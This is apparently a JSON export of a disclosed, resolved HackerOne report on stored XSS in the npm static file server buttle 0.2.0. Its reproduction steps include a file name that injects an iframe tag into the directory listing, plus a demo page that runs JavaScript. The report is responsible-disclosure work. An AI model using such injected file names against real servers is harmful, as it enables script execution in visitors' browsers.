{
  "id": 331110,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzExMTA=",
  "url": "https://hackerone.com/reports/331110",
  "title": "[buttle] HTML Injection in filename leads to XSS when directory listing is displayed in the browser",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-03-29T14:49:58.414Z",
  "submitted_at": "2018-03-29T14:49:58.414Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2019-5422"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-07-04T19:24:02.294Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-07-04T19:23:51.111Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report HTML Injection in buttle module.\n\nDue to lack of filenames sanitization, it is possible to inject malicious ```iframe``` tag via filename and execute arbitray JavaScript code.\n\n# Module\n\n**module name:** buttle\n**version:** 0.2.0\n**npm page:** https://www.npmjs.com/package/buttle\n\n## Module Description\n\nSimple static file (+ markdown) server.\n\n\n## Module Stats\n\nStats:\n\nN/A, estimated ~20-40 downloads/week\n\n# Vulnerability\n\n## Vulnerability Description\n\nWhen ```buttle``` displays directory index in the browser, it uses ```directory.js``` middleware from ```connect``` module to create an output with HTML. Because methods to escape user output used in this middleware are not sufficient enough (it's actually quite outdated version of ```connect```), it is possible to inject ```iframe``` tag with ```src``` attribute set to arbitrary HTML file, which can contain any executable JavaScript code.\n\n## Steps To Reproduce:\n\n- install ```buttle```:\n\n```\n$ npm i buttle\n```\n\n- create file with the following name: ```\"><iframe src=\"malware_frame.html\">```\n\n- create ```malwrae_frame.html``` file with following content:\n\n```html\n<html>\n\n<head>\n    <meta charset=\"utf8\" />\n    <title>Frame embeded with malware :P</title>\n</head>\n\n<body>\n    <p>iframe element with malicious code</p>\n    <!-- <script type=\"text/javascript\" src=\"malware.js\"></script> -->\n    <script>\n        alert('Uh oh, I am bad, bad malware!!!')\n    </script>\n</body>\n\n</html>\n```\n\n- run buttle:\n\n```\n$ ./node_modules/buttle/bin/buttle -p 8080\nListening on port 8080\n```\n\n- in browser, open the following url:\n\n```\nhttp://localhost:8080\n```\n\nYou see JavaScript from ```malware_frame.html``` executed immediately:\n\n{F279830}\n\n\n## Patch\n\nProbably updating all dependiences is a good solution.\n\n\n## Supporting Material/References:\n\n\n- Operating system: Ubuntu 16.04\n- Node.js 8.9.4\n- npm v. 5.6.0\n- Chromium Version 67.0.3367.0 (Developer Build) (64-bit)\n\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\nI hope my report will help to keep Node.js ecosystem and its users safe :)\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nAn attacker is able to execute arbitrary JavaScript code in user's browser\n\nThe hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**URL**\nhttp://localhost:8080\n\n**Verified**\nYes\n\n",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 279830,
      "file_name": "1.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/279/830/c62e96607f1b51ce8afdf216192a022ffa10a776/1.jpg?response-content-disposition=attachment%3B%20filename%3D%221.jpg%22%3B%20filename%2A%3DUTF-8%27%271.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5PYIVGUM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075108Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJHMEUCIQCxbKVFfwxvn2aMDuXVLe1QzQK3TCJpdEoanp1JuiXzCgIgLG404Fpz8ZdPE%2BVxOGyXkaneEtoAwPvWzebl2kOqeJoqsQUIKRADGgwwMTM2MTkyNzQ4NDkiDNffnc3v799tsQTD4CqOBWdOP%2BfWq5y3voATniH3LEZIyCon5M%2BAmx0Zm37wkxRFF%2FGkbHL3PJgkI%2B%2FW9YgllfnrqRSyjZfMg%2BTDyRA8F75E6xAHAd8tlxenAYYgPBc2Dhc10X5ihoe3kwtwp19Wx0D7ueWQP8WZaoCaIhS2IvaPsTRktad2Ktwh9UAa3S8SoD1%2FsOiixEVomorIRINMrfb5oKlJkxrMIJDUXq4Aw%2B0RvXG%2FtwAeVTAJ3yBLxBuNWln%2B7EAJYVeHBtYlSzj4tCTJYjTlXtd7lcxJ1sT4GXVQI%2BGcHuZmdCJA4oZf0z%2FZxRJEV6hSqncwVJnLfvHolXneHrT%2BXXcikChEhjO5HFl%2FkTXo2GYWiWUvGHcmJKjvLeJ8XHI%2FKv6b2mX75Z5yw1BdwAp1xl2CTJV2gO3CR9QODsl5mRi8ahtEHG7fNwG1p%2F9YuaVJYfpuP4Feni90I3zw3%2B125VtZ44CRAtbFs4unZlyKY3PMJXc57Rcxfe3zsUP4I5MnViqXBHRmG%2FbHd2X2JKW1302xUa5cpZgFTD8W9CqfDkw1e%2FGDSSftnTeY4oKYb3HcCiFq5dkdKw%2FzMlT%2BB1QBKKiuc%2FvFGwnfmKB4lNNJa%2FN8NwKD7AaLKAzbHNr4OZvnFLS9hi%2B1e2dRmU1sV3LJs6XFeaP1JhazIFAoyQKcFOFC02TgXs8J3H2cED2GpEGT4U%2BfRmNZajta8lvt1npglMNITLcS3AuAJHkqfC6ILLXZOhwBT4Mx2o%2BLQkmtdPnTGHBCv7xvHoJ5cLFwINIuuMxbBL6PgRjU2lsln6AwdKTaLJvpfjkSH9b%2Bce9wesNIXxAywsTFMlk1bbfxl54y5eYq5lS%2FTa1U%2BG9rL8OsVzxzJ5hrftXJkjDTqrqoBjqxARQvnFu2w0Y14KlU4OBcpKuBHgzD3VkvYuMrn2OwVRTK1BsM8eGnFJy3RMGIyvD3HxaV91qaLN6dJyWbWdFNjJUpVZZAZhSewXXr4iDQtR49zDh1kW%2BZ79UTOWlipVMpq05B2bgf%2BRpW5mvBV7A3o1UYWNTTyRAaEuMJGFPe%2BjNeLFL9KIMEBPbvxeLdMzzfZcVvy7s54UQ8C5hdT3QZ0MY3WW5ab3CN8d5Ntn1fJlIuoA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3827e95bdb9db6087d6304668958e50e22bea61a8327e449c5f6d4be474243da",
      "file_size": 32383,
      "type": "image/jpeg",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2018-08-03T19:23:51.256Z",
  "allow_singular_disclosure_after": -162131236.8386625,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "apapedulimu",
    "wragg-s"
  ],
  "severity": {
    "rating": "medium",
    "score": 5.2,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "low",
      "privileges_required": "high",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 8249,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "buttle",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 2572604,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2018-04-06T08:51:49.337Z",
      "updated_at": "2018-04-06T08:51:49.337Z",
      "additional_data": {
        "old_severity": "Medium",
        "new_severity": "Medium (5.2)",
        "old_severity_id": 133633,
        "new_severity_id": 136544
      },
      "actor": {
        "username": "marcinhoppe",
        "cleared": false,
        "verified": false,
        "url": "/marcinhoppe",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 2572608,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "",
      "automated_response": false,
      "created_at": "2018-04-06T08:52:04.361Z",
      "updated_at": "2018-04-06T08:52:04.361Z",
      "actor": {
        "username": "marcinhoppe",
        "cleared": false,
        "verified": false,
        "url": "/marcinhoppe",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 2572639,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "HiÂ @bl4de,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n",
      "automated_response": false,
      "created_at": "2018-04-06T08:52:44.604Z",
      "updated_at": "2018-04-06T08:52:44.604Z",
      "actor": {
        "username": "marcinhoppe",
        "cleared": false,
        "verified": false,
        "url": "/marcinhoppe",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 2573276,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ChangedScope",
      "message": "",
      "automated_response": false,
      "created_at": "2018-04-06T11:31:37.621Z",
      "updated_at": "2018-04-06T11:31:37.621Z",
      "actor": {
        "username": "marcinhoppe",
        "cleared": false,
        "verified": false,
        "url": "/marcinhoppe",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "old_scope": "Other module",
      "new_scope": "buttle",
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 2805804,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I opened a GitHub issue: https://github.com/jtrussell/buttle/issues/21.",
      "automated_response": false,
      "created_at": "2018-05-28T11:44:37.199Z",
      "updated_at": "2018-05-28T11:44:37.199Z",
      "actor": {
        "username": "marcinhoppe",
        "cleared": false,
        "verified": false,
        "url": "/marcinhoppe",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 2988836,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "",
      "automated_response": false,
      "created_at": "2018-07-04T19:23:41.515Z",
      "updated_at": "2018-07-04T19:23:41.515Z",
      "actor": {
        "username": "marcinhoppe",
        "cleared": false,
        "verified": false,
        "url": "/marcinhoppe",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "bl4de",
        "url": "/bl4de"
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 2988837,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2018-07-04T19:23:51.156Z",
      "updated_at": "2018-07-04T19:23:51.156Z",
      "first_to_agree": true,
      "actor": {
        "username": "marcinhoppe",
        "cleared": false,
        "verified": false,
        "url": "/marcinhoppe",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 2988838,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ManuallyDisclosed",
      "message": "",
      "automated_response": false,
      "created_at": "2018-07-04T19:24:02.242Z",
      "updated_at": "2018-07-04T19:24:02.242Z",
      "actor": {
        "username": "marcinhoppe",
        "cleared": false,
        "verified": false,
        "url": "/marcinhoppe",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}